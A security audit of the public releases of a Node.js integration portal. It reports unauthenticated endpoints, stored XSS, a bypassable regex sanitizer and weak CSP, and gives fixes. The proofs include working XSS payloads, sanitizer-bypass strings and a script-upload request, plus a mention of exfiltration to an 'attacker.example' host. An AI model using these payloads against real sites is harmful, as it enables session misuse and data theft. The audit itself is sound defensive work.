# Security Review — Publicly Released Tags

**Scope:** the 11 public GitHub releases of `pallefar/ma-integration-portal` (v1.0.0 … v2.0.1), as downloaded and run from the turnkey zips or read as public source.
**Threat model:** someone downloads a public release zip, or reads the public source, and runs or attacks it.
**Reviewed at:** tags via `git cat-file blob <tag>^{commit}:<path>`; "still in main" compared against the working tree at `061931d`.
**Date:** 2026-08-06
**Explicitly out of scope (covered by a separate reviewer):** git history, committed secrets, dependency CVEs.

> **Method note.** Every finding below was verified against code at the tag. The findings marked **PROVEN LIVE** were demonstrated by extracting `v2.0.1` with `git archive` into a sandbox, running `node server.js` with **default environment (no env vars set at all)** on port 3711, and issuing real requests. That is precisely what a user who unzips a release and double-clicks the launcher gets.

---

## 1. Executive summary

Every one of the 11 public releases ships **open by default**: with no environment variables set — the exact state of a freshly unzipped turnkey bundle — all 60 write endpoints, both `/api/admin/*` routes and every read endpoint are reachable with no authentication, and the server binds all network interfaces, not loopback, so anyone on the same LAN/VPN/Wi-Fi can reach them. I confirmed this live at v2.0.1 and confirmed the same default-open code path (`if (!ADMIN_TOKEN) return next();`) exists identically in all 11 tags. Two consequences are directly exploitable and I demonstrated both end-to-end: an unauthenticated caller can **write arbitrary HTML/JavaScript into the web root** via `POST /api/slides/upload` and have it served same-origin under a CSP that permits `'unsafe-inline'`, and an unauthenticated caller can **plant stored XSS** via `POST /api/employees` that executes in a victim's browser — I observed `alert(document.domain)` actually fire in headless Chrome. The good news, and it is real: the hardening that landed after v2.0.1 genuinely fixed the authentication default in `main` (auth is now fail-closed on every `/api` route), and several things I specifically went looking for were already correct at the tags — `db.json` is outside the static root, the admin zip export excludes `db.json`/`.env`/`sent_emails`, the Gemini key and DB connection credentials are stripped from API responses, upload filenames are correctly sanitized against traversal, the launchers are clean, and `execution.js`/`banners.js` escape properly. The single most actionable result is that **two proven XSS defects are byte-identical in current `main`** — the unescaped sink at `public/js/leaders.js:116-117`, and a hand-rolled regex HTML sanitizer that I bypassed with `<img/onerror=…>` because its handler-stripping rules require a whitespace separator and `/` is also valid HTML — and the shipped launchers set `DEMO_OPEN=1`, which disables all `/api` auth; so those are not historical, they are live today. **7 of the 10 findings survive into `main`; 3 are historical.**

---

## 2. Findings table

| ID | Severity | Title | Tag(s) affected | Still in `main`? | Evidence |
|----|----------|-------|-----------------|------------------|----------|
| R-01 | **Critical** | Default environment leaves all writes + admin routes unauthenticated | all 11 (v1.0.0–v2.0.1) | **No** (fail-closed since D-01) — but see R-07 | `server.js:160` @v2.0.1 |
| R-02 | **Critical** | Unauthenticated arbitrary same-origin HTML/JS write into web root | all 11 | **Yes** (endpoint present; open under `DEMO_OPEN=1`) | `server.js:1055-1070` @v2.0.1 |
| R-03 | **High** | Stored XSS — employee `name`/`role` rendered unescaped **(proven live)** | all 11 | **Yes — identical** | `public/js/leaders.js:116-117` |
| R-09 | **High** | Regex HTML sanitizer bypassed by `/` separator **(proven live)** | all 11 | **Yes — identical** | `public/js/page-layout.js:14-19`, `public/js/transitions.js:3265-3270` |
| R-04 | **High** | Server binds all interfaces (`0.0.0.0`), not loopback | all 11 | **Yes** | `server.js:3159` @v2.0.1 |
| R-05 | **Medium** | Unauthenticated read of all portal data (PII, assessments, comms) | all 11 | **No** (fail-closed) | `server.js:144` @v2.0.1 |
| R-06 | **Medium** | CSP `connect-src`/`img-src` allow `*.huggingface.co` — exfil channel | all 11 | **Yes** | `server.js:24-37` @v2.0.1 |
| R-07 | **Medium** | Turnkey launchers set `DEMO_OPEN=1`, disabling all `/api` auth | n/a (post-v2.0.1) | **Yes** | `start.command:30`, `start.bat:40` @HEAD |
| R-10 | **Medium** | Admin token accepted via query string + non-constant-time compare; **no CSP at all** | **v1.0.0–v1.1.0 only** | **No** (fixed at v1.2.0) | `server.js:51-52` @v1.0.0 |
| R-08 | **Low** | Admin zip export includes runtime `public/uploads/` contents | all 11 | **Yes** | `server.js:411` @v2.0.1 |

**Counts: 2 Critical · 3 High · 4 Medium · 1 Low (10 total).**

**Still present in `main`: 7** — R-02 (Critical), R-03 (High), R-09 (High), R-04 (High), R-06 (Medium), R-07 (Medium), R-08 (Low).
**Historical (fixed in `main`): 3** — R-01 (Critical), R-05 (Medium), R-10 (Medium).

Rows are ordered by severity, not by ID — R-09 and R-10 were found late in the review and keep their assigned IDs.

---
## 3. Per-finding detail

### R-01 — Critical — Default environment leaves all writes + admin routes unauthenticated

**What it is.** The `/api` gate is opt-in. If `ADMIN_TOKEN` is unset and `PORTAL_AUTH` is not `1` — the state of a freshly unzipped release — the gate returns `next()` for every write and every admin route.

```js
// server.js:141-163 @v2.0.1
app.use('/api', (req, res, next) => {
  const isWrite = req.method !== 'GET' && req.method !== 'HEAD' && req.method !== 'OPTIONS';
  const isAdminPath = req.path.startsWith('/admin');
  if (!isWrite && !isAdminPath) return next();        // all GETs pass, always
  ...
  if (!ADMIN_TOKEN) return next();                    // <-- server.js:160  DEFAULT PATH
```

**Quantified.** At v2.0.1: **60 of 60 write endpoints** (40 `POST` + 20 `DELETE` under `/api`) and **2 of 2** `/api/admin/*` routes are open with default env. At v1.0.0–v1.5.1 it is **48 of 48** writes plus the same 2 admin routes. The app has no `PUT`/`PATCH` routes. The `if (!ADMIN_TOKEN) return next();` line is present and identical in **all 11 tags**.

**How it is reached.** Any HTTP client that can reach the port. Combined with R-04 (binds all interfaces) this is the whole local network, not just the machine running it.

**Proof (live, v2.0.1, default env).** The server itself announces it:
```
[security] ADMIN_TOKEN not set — write/admin API endpoints are OPEN.
```
Unauthenticated admin export succeeded: `GET /api/admin/download-zip` → `HTTP=200 bytes=22343295`.
Unauthenticated admin state change succeeded: `POST /api/admin/migrate-db` → `{"success":true,...}`.

**Still in `main`?** **No — genuinely fixed.** `server.js:199-212` and the consolidated gate at `server.js:392-431` invert the default: auth is required on every `/api/*` route including reads, and unauthenticated requests get `401 {authRequired:true}`. This is a real fix, not a documentation change. **Caveat:** `DEMO_OPEN=1` restores the fully-open behaviour, and the shipped launchers set it — see R-07.

**Fix (for anyone still running a release zip).** Set `ADMIN_TOKEN` to a long random value before starting, or better, do not expose the port: bind loopback and use an SSH tunnel. Upgrading to post-v2.0.1 code is the real fix.

---

### R-02 — Critical — Unauthenticated arbitrary same-origin HTML/JS write into the web root

**What it is.** `POST /api/slides/upload` takes a caller-supplied `content` string and writes it verbatim to `public/uploads/slides/<name>.html`, which `express.static` then serves. The handler *forces* an `.html` extension, so the output is always parsed as HTML.

```js
// server.js:1055-1070 @v2.0.1
const content = typeof b.content === 'string' ? b.content : '';
const base = String(b.filename || 'slide.html').replace(/[^a-zA-Z0-9._-]/g, '_').replace(/^\.+/, '');
const safe = /\.html?$/i.test(base) ? base : base + '.html';
...
fs.writeFileSync(path.join(dir, fname), content, 'utf8');
res.json({ success: true, url: '/uploads/slides/' + fname });
```

The filename *is* correctly sanitized (no traversal — `/` is stripped by the character class, leading dots removed, and the name is prefixed with a timestamp + random hex). The vulnerability is not the path; it is that **the file body is unrestricted and the file is served as `text/html` from the application's own origin**, under a CSP that contains `script-src 'self' 'unsafe-inline'`.

**How it is reached.** Unauthenticated `POST` with default env (R-01). The response hands back the exact URL.

**Proof (live, v2.0.1, default env).**
```
POST /api/slides/upload  {"filename":"pwn","content":"<script>fetch('/api/settings')...</script>"}
→ {"success":true,"url":"/uploads/slides/1786049623626_8e05ea_pwn.html"}

GET /uploads/slides/1786049623626_8e05ea_pwn.html
→ HTTP/1.1 200 OK
   Content-Type: text/html; charset=UTF-8
   Content-Security-Policy: ... script-src 'self' 'unsafe-inline' 'unsafe-eval' ...
   <script>fetch("/api/settings")...</script>
```

**Impact.** Any victim who opens that URL executes attacker JavaScript on the app origin. The CSP does meaningfully constrain *exfiltration* (`connect-src 'self'` blocks the naive callback — see R-06 for the gap), but it does **not** constrain same-origin actions: the script can read every API endpoint and write to all 60 open ones, deface any page, or render a convincing fake login form on the real origin. Where `PORTAL_AUTH=1` is in use, the victim's `HttpOnly` cookie is automatically attached to those same-origin fetches, so HttpOnly does not help.

**Still in `main`?** **Yes, the endpoint is unchanged** (`server.js:1770`). It is no longer anonymous by default — it falls through to `DEFAULT_WRITE_ROLES = ['admin','hrbp','pmo']` (`server.js:322`) — but two gaps remain: (a) under `DEMO_OPEN=1`, which the shipped launchers set (R-07), it is fully anonymous again; and (b) `hrbp` and `pmo` are not administrators, yet can host arbitrary same-origin JavaScript, which is a privilege-escalation primitive against `admin`.

**Fix.** Restrict to `admin` explicitly via `ROLE_WRITE_POLICY`; serve uploaded slides from a separate origin or with `Content-Disposition: attachment` + `Content-Type: text/plain`; or sanitize/allowlist the HTML. Serving untrusted HTML from the app origin is the root problem.

---

### R-03 — High — Stored XSS via employee `name` / `role` (PROVEN LIVE, and still in `main`)

**What it is.** `POST /api/employees` stores `name` and `role` with no validation or encoding (`server.js:2441-2495` @v2.0.1 — the handler assigns `employee.name = name;` directly). `public/js/leaders.js` then interpolates both into `innerHTML`:

```js
// public/js/leaders.js:110-117 — IDENTICAL at v2.0.1 and at HEAD
row.innerHTML = `
  ...
  <div ...>${emp.name[0]}</div>
  <h5 ...>${emp.name}</h5>
  <p ...>${emp.role} &bull; ...`;
```

`leaders.js` **does** define an `escapeHtml()` helper at line 268 — but it is used at exactly one site (line 219) and **not** on `emp.name` / `emp.role`. This is the "documented as incomplete" XSS audit showing up concretely.

**How it is reached.** Unauthenticated `POST /api/employees` (R-01), then any user visiting `leaders.html`. The same unescaped employee fields also reach `public/js/signage.js:300-306` (`emp.name`, `emp.role`, `emp.department`) and `public/js/dashboard.js:783-801`.

**Proof (live, v2.0.1, default env, headless Chrome).**
```
POST /api/employees {"name":"<img src=x onerror=alert(document.domain)>","role":"...","department":"R&D"}
→ {"success":true,...}
GET /api/employees → STORED RAW -> '<img src=x onerror=alert(document.domain)>'

Browser @ /leaders.html:
  injected <img onerror> elements in DOM: 2
  events: ["DIALOG:127.0.0.1"]
```
The dialog actually fired — this is executed JavaScript, not a reflected string. (`<script>` would not execute via `innerHTML`; the `<img onerror>` form does, which is why that payload was used.)

**Still in `main`?** **Yes — the sink is byte-identical** at `public/js/leaders.js:113,116,117`. Planting now requires an authenticated `admin`/`hrbp`/`pmo` session *unless* `DEMO_OPEN=1` is set — which the shipped launchers do (R-07). Because the demo lane and the real-deal lane share one origin, a payload planted in the demo lane executes with the victim's real-deal session cookie attached to same-origin requests.

**Fix.** Wrap every interpolation of stored data in the existing `escapeHtml()` — `${escapeHtml(emp.name)}`, `${escapeHtml(emp.role)}` — or build the rows with `textContent` as `banners.js` already does correctly. Add server-side input validation as defence in depth.

---
### R-09 — High — Regex HTML sanitizer bypassed by `/` attribute separator (PROVEN LIVE, and still in `main`)

**What it is.** Two places sanitize admin/CMS-authored rich HTML with the same hand-rolled regex chain before assigning to `innerHTML`:

```js
// public/js/page-layout.js:14-19  and  public/js/transitions.js:3265-3270 @v2.0.1 (identical)
.replace(/<\/?(?:script|iframe|object|embed|form|meta|base|link)\b[^>]*>/gi, '')
.replace(/\son\w+\s*=\s*"[^"]*"/gi, '')
.replace(/\son\w+\s*=\s*'[^']*'/gi, '')
.replace(/\son\w+\s*=\s*[^\s>]+/gi, '')
.replace(/(=\s*["']?\s*)(?:javascript|vbscript)\s*:/gi, '$1');
```

All three event-handler rules require `\s` (whitespace) immediately before `on\w+`. In HTML, **`/` is also a valid attribute separator**, so `<img/onerror=…>` never matches and passes through untouched. The tag-stripping rule is additionally defeated by nesting, because it is applied only once.

**Proof (sanitizer level, executed against the exact regex chain):**
```
SURVIVES "<img/onerror=alert(1) src=x>"            ->  "<img/onerror=alert(1) src=x>"
SURVIVES "<scr<script>ipt>alert(1)</scr</script>ipt>" ->  "<script>alert(1)</script>"
SURVIVES "<ifr<iframe>ame src=x onload=alert(1)>"  ->  "<iframe src=x>"
stripped  "<img src=x onerror=alert(1)>"           ->  "<img src=x>"
stripped  "<svg onload=alert(1)>"                  ->  "<svg>"
```

**Sinks.** `public/js/page-layout.js:101` — `region.innerHTML = … + sanitize(body) + …` (CMS page body, written via open `POST /api/pages`); `public/js/transitions.js:3283` — `el.innerHTML = mdBold(stripDangerousHtml(v))` for every `[data-i18n-html]` element (written via open `POST /api/i18n`). Six shipped pages carry `data-i18n-html` attributes.

**Proof (live, end-to-end, v2.0.1, default env, headless Chrome).**
```
POST /api/i18n {"lang":"en","key":"intexc.buddy_li1",
                "value":"<img/onerror=alert(String.fromCharCode(88,83,83)) src=x>"}   → success (no auth)
GET /api/i18n → '<img/onerror=alert(String.fromCharCode(88,83,83)) src=x>'   (stored raw)

Browser @ /integration-excellence.html:
  img[onerror] elements that survived sanitize(): 1
  dialogs fired: ["DIALOG:XSS"]
```

**Still in `main`?** **Yes — both copies are unchanged** (`public/js/page-layout.js:16-18`, `public/js/transitions.js:3333-3335`). The comment in the source already concedes the design ("DOMPurify is the recommended robust upgrade"); this finding is the concrete demonstration that the interim regex is bypassable, not merely imperfect.

**Fix.** Replace both with DOMPurify (or render via `textContent` where rich markup is not genuinely required). If the regex must stand as a stopgap, at minimum change `\s` to `[\s/]` in the three handler rules and apply the tag strip in a loop until the output stops changing — but regex HTML sanitizing is not a defensible long-term control.

---

### R-04 — High — Server binds all network interfaces, not loopback

**What it is.** `app.listen(PORT, …)` is called with no host argument (`server.js:3159` @v2.0.1), so Node binds `0.0.0.0`/`::`. A tool documented as "runs laptop-local" is in fact reachable from the whole network segment.

**Proof (live).** `lsof -nP -iTCP -sTCP:LISTEN` → `node … TCP *:3711 (LISTEN)` — `*`, not `127.0.0.1`.

**Why it matters.** This is the multiplier on R-01/R-02/R-03/R-09. On its own, binding broadly is a configuration choice; combined with a default-open API it means any device on the same corporate LAN, VPN segment, hotel or café Wi-Fi can read and modify everything without credentials.

**Still in `main`?** **Yes** — `server.js:5297` is still `app.listen(PORT, …)`.

**Fix.** `app.listen(PORT, process.env.BIND_HOST || '127.0.0.1', …)` and require an explicit opt-in to expose beyond loopback.

---

### R-05 — Medium — Unauthenticated read of all portal data

**What it is.** The gate short-circuits every non-admin `GET` before any authentication logic: `if (!isWrite && !isAdminPath) return next();` (`server.js:144` @v2.0.1). The comment says these are "public read-only GETs handled per-endpoint", but the handlers themselves do not authenticate.

**Proof (live, no credentials).** `GET /api/employees` returned full employee records (names, roles, departments, buddy names and **buddy email addresses**); `GET /api/hrbps` returned names and `@te.com` email addresses; `GET /api/assessments` returned assessment responses, scores and generated plans; `GET /api/communications` returned sent-message history; `GET /api/projects` returned project metadata (target company, sector, HQ, acquisition date, synergy objective).

In a shipped release this is demo seed data. The severity is Medium rather than High **for the released artifact specifically**, because these releases predate real-deal use — but any operator who entered real data into a release zip exposed it to the network.

**What is NOT exposed (verified, good):** `db.json` sits at the repo root while `express.static` is rooted at `public/` (`server.js:69`), so the database file is **not** reachable over HTTP. `GET /api/settings` strips the Gemini key (`delete out.geminiApiKey`, `server.js:392`, returning only a `hasGeminiApiKey` boolean) and strips stored DB credentials (`delete out.databaseConfig.connectionDetails`, `server.js:395`) — I confirmed live that a planted `password: "SUPERSECRET"` did **not** come back. Password material (`db.users[].hash`/`.salt`) is never returned by any endpoint.

**Still in `main`?** **No** — reads are authenticated in the fail-closed gate (except under `DEMO_OPEN=1`, R-07).

---

### R-06 — Medium — CSP `connect-src` / `img-src` allow `*.huggingface.co`, weakening exfiltration control

**What it is.** The CSP (`server.js:24-37` @v2.0.1) is otherwise well-constructed — it is the main reason R-02's payload could not simply POST data to an attacker domain. But it allows `https://*.huggingface.co` in both `connect-src` and `img-src` (for the vendored Transformers.js model downloads):

```
connect-src 'self' https://huggingface.co https://*.huggingface.co https://cdn-lfs.huggingface.co https://cdn-lfs-us-1.huggingface.co
img-src 'self' data: blob: https://img.youtube.com https://i.ytimg.com https://*.huggingface.co
```

Hugging Face is a platform on which anyone can create an account and host content, so an allowlist entry covering an entire multi-tenant wildcard domain gives XSS (R-02/R-03/R-09) a plausible outbound channel that `'self'` alone would deny.

**Status: partially unproven.** I verified the CSP header is served exactly as above (captured live in the R-02 response). I did **not** attempt to actually exfiltrate data to a Hugging Face endpoint, so the practical write-primitive is unconfirmed. Treat this as a defence-in-depth weakness, not a demonstrated exfil path.

**Still in `main`?** **Yes** — `server.js:108,110` are unchanged.

**Fix.** Narrow to the exact hosts the vendored assets require, or drop the entries entirely — the Transformers.js runtime is vendored locally at `public/vendor/transformers/`, so remote model fetches may no longer be needed at all.

---

### R-07 — Medium — Turnkey launchers set `DEMO_OPEN=1`, disabling all `/api` auth (current `main`)

**What it is.** This one is **not** in the released tags — it is a property of the post-v2.0.1 hardening, and it is the reason several findings above remain live rather than historical. `main` is fail-closed by default, but `DEMO_OPEN=1` restores fully anonymous access, and the shipped double-click launchers set it unconditionally:

```
start.command:30:  export DEMO_OPEN=1
start.bat:40:      set "DEMO_OPEN=1"
```

The server does warn loudly at boot (`server.js:189-190`: "ALL /api authentication and authorization is DISABLED"), and the flag only opens requests that resolve to the demo database (`isOpenMode()` requires `req.isDemo === true`, `server.js:228`) — that scoping is a genuinely thoughtful design. The residual risk is that the demo lane and the real-deal lane **share one browser origin**, so R-03/R-09 payloads planted anonymously in the demo lane execute on the same origin a logged-in real-deal user browses, with their session cookie attached to same-origin requests. `HttpOnly` (`server.js:545`) prevents cookie theft but not cookie *use*.

**Still in `main`?** **Yes** — this finding is specifically about `main`.

**Fix.** Fix R-03 and R-09 (the payload sinks), which removes the cross-lane pivot regardless of `DEMO_OPEN`. Consider serving the demo showcase from a distinct origin/port so the origin boundary matches the trust boundary.

---

### R-08 — Low — Admin zip export bundles runtime `public/uploads/` contents

**What it is.** `GET /api/admin/download-zip` shells out to `zip -r … .` with an exclusion list (`server.js:411` @v2.0.1). The exclusion list is **good** — it covers `db.json`, `db.json.tmp`, `db.json.bak`, `.env`, `.env.*`, `public/sent_emails/*`, `.git/*`, `node_modules/*` — and I confirmed live that the generated archive contains **zero** `db.json` entries. It does not, however, exclude `public/uploads/`, so any file previously uploaded through `/api/media` or `/api/slides/upload` is redistributed inside the export.

**Proof (live).** After planting the R-02 file, the unauthenticated export contained it:
```
public/uploads/slides/1786049623626_8e05ea_pwn.html
```

**On command injection (checked, negative):** the `execSync` command line interpolates only `zipPath`, which is built from `os.tmpdir()` and `Date.now()` — **no request-controlled value reaches the shell**. I specifically looked for this and found no injection. This is the only `child_process` use in the server.

**Still in `main`?** **Yes** — `server.js:1113` still lacks an uploads exclusion, though it has correctly added `data/*.db`, `data/audit.db*` and `data/deals/*` exclusions for the new SQLite stores.

**Fix.** Add `"public/uploads/*"` to the exclusion list.

---
### R-10 — Medium — Earlier tags only: admin token accepted via query string, compared non-constant-time

**This is the "fixed later, but those zips are still out there" finding.** It affects **v1.0.0, v1.0.1, v1.0.2, v1.1.0** and was removed from v1.2.0 onward.

```js
// server.js:46-54 @v1.0.0  (identical through v1.1.0)
if (!isWrite && !isAdminPath) return next();
if (!ADMIN_TOKEN) return next();
const supplied = req.get('X-Admin-Token') || (req.query && req.query.admin_token) || '';   // <-- query string
if (supplied && supplied === ADMIN_TOKEN) return next();                                   // <-- non-constant-time
```

Two defects, both since corrected:
1. **`?admin_token=` accepted.** An operator who did the right thing and set `ADMIN_TOKEN` could still leak it into web-server access logs, proxy logs, browser history and `Referer` headers. The v1.2.0+ code explicitly reverses this with the comment *"Header only — never accept the secret via query string (it would leak into access logs, proxies and browser history)."*
2. **`===` comparison.** Non-constant-time, so theoretically token-guessing via timing. Replaced in v1.2.0 by `timingSafeEqualStr()` (SHA-256 to fixed length, then `crypto.timingSafeEqual`), which is a correct implementation.

**Also earlier-tags-only: no CSP and no security headers at all.** `v1.0.0`–`v1.1.0` ship **zero** security response headers — no `Content-Security-Policy`, no `X-Content-Type-Options`, no `X-Frame-Options`. Those were introduced at v1.2.0. The practical consequence is that **R-02 is strictly worse on v1.0.0–v1.1.0**: arbitrary HTML/JS written into the web root runs with no CSP restraint at all, so the naive exfiltration that CSP blocked at v2.0.1 (`fetch('https://attacker.example/…')`) succeeds outright.

**Still in `main`?** **No** — both defects were fixed pre-v1.2.0 and the headers are present from v1.2.0 on.

**Verified-negative note:** no route was ever *removed* between v1.0.0 and v2.0.1 — `comm -23` over the sorted route lists at both tags returns empty. The endpoint surface only grew (48 → 60 writes). So apart from R-10 there is no "exploitable thing that existed only in an early tag".

---

## 4. What I could NOT verify

Being explicit here, because an honest gap list is worth more than false confidence.

1. **The actual released zip artifacts.** I reviewed the **git tags**, not the binary zips attached to the GitHub releases. The bundles additionally contain a portable Node.js runtime (`ma-integration-portal/node/`) that is **not in git** — it was reused across releases from prior release assets. I could not inspect that Node build, its version, or its CVE exposure. A Node binary pinned at v22.23.1 and reused for months across 11 releases is worth checking separately; that is a real gap in this review.
2. **R-06 exfiltration via `*.huggingface.co`.** I verified the CSP header allows it but did not build a working exfil primitive. Labelled unproven above.
3. **Dependency vulnerabilities.** Out of scope by instruction (separate reviewer), and `node_modules/` is committed at every tag, so each release pins whatever tree existed at tag time. I ran no `npm audit`.
4. **The other ~340 `innerHTML` sinks.** I found 350 HTML-injection sinks across the frontend at v2.0.1 and triaged them by targeted reading plus an automated unescaped-interpolation scan. I proved two (R-03, R-09) and verified several files as genuinely safe (`execution.js` uses `esc()` consistently; `banners.js` is `textContent`-only — its single "sink" hit is a comment). **I did not individually audit every remaining sink.** Files with the highest unreviewed sink counts are `admin-cms.js` (66), `dashboard.js` (47), `admin.js` (44), `employee.js` (42). Several look likely-exploitable on the same pattern as R-03 — e.g. `admin.js:373` (`${q.text}` from open `POST /api/questions`), `pmo.js:1073-1076` (`${s.title}`, `${s.desc}`), `signage.js:300-306` (employee fields), `employee.js:2174` (lesson `body` rendered as raw HTML by design) — but I did not build proofs for them, so I am not listing them as findings. **Assume more stored-XSS instances exist.**
5. **Authenticated authorization at the tags.** With `PORTAL_AUTH=1` (v2.0.0+ only), I did not test whether a low-privilege role can perform admin-only actions. The gate distinguishes only `admin` from "any session" for writes at v2.0.1 (`server.js:151-158`), which suggests any authenticated user can write to most endpoints — but I did not confirm this by exercising it, and the project's own history records repeated authz bugs found at review gates, so this deserves its own pass.
6. **Prototype pollution.** `POST /api/settings` copies arbitrary caller keys (`target[key] = req.body[key]`, `server.js:707-710` @v2.0.1) with no key allowlist. I noted it and probed the shape, but did not establish a concrete exploit: it writes into `db.settings` (not the db root, so `db.users` is not reachable this way), and an assignment to `__proto__` does not become an own property and so does not survive `JSON.stringify`. **Unproven — flagged for follow-up, not claimed as a vulnerability.**
7. **`aiService.js` / `ragService.js` internals.** I confirmed the Gemini key is stripped from API responses and that `/api/rag/upload` decodes base64 into `pdf-parse` (a memory/DoS consideration given the `50mb` body limit), but I did not audit the AI prompt-construction path for injection into the outbound Gemini request.
8. **Windows-specific launcher behaviour.** I read `start.bat` and `start.command` and found them clean — they `cd` to their own directory, request no elevation, pass no user input to a shell, and write nothing outside their folder. I did not *execute* either on a real Windows or macOS desktop.
9. **DoS/resource limits.** `express.json({ limit: '50mb' })` plus unauthenticated writes means trivial disk-filling via `/api/media` or `/api/slides/upload`. I did not test it and have not counted it as a separate finding, but it follows directly from R-01.

---

## 5. Summary of what was checked and found clean

Recording the negatives explicitly, because several are non-obvious and were specifically requested:

- **`db.json` is not web-reachable.** `express.static` is rooted at `public/`; `db.json` lives at the repo root (`server.js:14,69`). Verified at v2.0.1.
- **No path traversal in uploads.** `POST /api/media` and `POST /api/slides/upload` both strip `/` and leading dots from filenames and prefix a server-generated timestamp; `DELETE /api/media/:id` dereferences a server-generated `url`, not caller input.
- **No command injection.** The single `child_process` call (`execSync` in the zip export) interpolates only `os.tmpdir()` + `Date.now()`.
- **No zip-slip.** The export only *creates* an archive; nothing in the app extracts one.
- **Secrets are stripped from API responses.** Gemini key and DB `connectionDetails` both removed in `publicSettings()`; confirmed live with a planted password.
- **Password material never leaves the server.** No endpoint returns `db.users[].hash`/`.salt`.
- **iframe URL validation is correct.** `openHtmlSlide()` (`transitions.js:82-86`) parses with `new URL()` and requires `http:`/`https:`, correctly rejecting `javascript:`/`data:` — with an accurate comment explaining why `encodeURI` would not suffice.
- **Session cookies are `HttpOnly` + `SameSite`** (`Lax` at v2.0.1, `Strict` at HEAD), and v2.0.1 login has a scrypt hash, a dummy-salt constant-time path for unknown users, and an 8-attempt/minute throttle. That login implementation is good work.
- **Launchers are clean** (see gap 8 for the caveat that I did not run them).
- **`execution.js` and `banners.js` are correctly escaped** — the convention is real where it was applied; the problem is that it was not applied uniformly.
- **Stray root scripts** (`fix_script.js`, `replace_script.js`, `remove_layout.js`, present at v1.0.0 and later removed) are developer codemods, are not served from `public/`, and are never `require`d by `server.js`. Not a network-reachable issue.

---

## 6. Recommended order of action

1. **Fix R-03 and R-09 now** — they are live in `main`, both proven, and both are small, contained edits (`leaders.js` escaping; swap the two regex sanitizers for DOMPurify). These do not depend on any release decision.
2. **Fix R-02** — restrict `/api/slides/upload` to `admin` and stop serving caller-authored HTML from the app origin.
3. **Fix R-04** (bind loopback by default) and **R-08** (exclude `public/uploads/*`) — both one-liners.
4. **Reconsider R-07** — the launchers' `DEMO_OPEN=1` is what keeps 1–3 anonymously reachable.
5. **Decide what to do about the 11 public releases.** Every one is default-open and network-bound. Options: add a clear security notice to the release descriptions, mark them deprecated/pre-release, or cut a hardened release from post-v2.0.1 `main` and point users at it. The 235 unreleased hardening commits mean the fix already largely exists — it just has never been published.
6. **Then** work through gap 4 (the unaudited `innerHTML` sinks) and gap 5 (authenticated authorization) as their own passes.
